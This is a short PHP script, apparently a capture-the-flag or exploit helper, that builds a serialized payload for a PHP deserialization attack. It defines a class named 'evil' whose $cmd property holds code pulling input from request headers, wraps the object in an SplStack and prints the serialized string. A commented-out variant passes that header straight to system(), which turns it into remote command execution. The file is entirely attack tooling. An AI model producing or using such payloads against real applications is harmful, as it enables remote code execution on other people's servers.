<?php
// 生成 C 开头的反序列化
class evil{
    public $cmd;
    public $a;

}
$evilClass = new evil();
//$evilClass->cmd = 'system(next(getallheaders()));__halt_compiler();';
$evilClass->cmd = 'next(getallheaders());__halt_compiler();';
$a = new SplStack();
$a -> push($evilClass);
echo serialize($a);

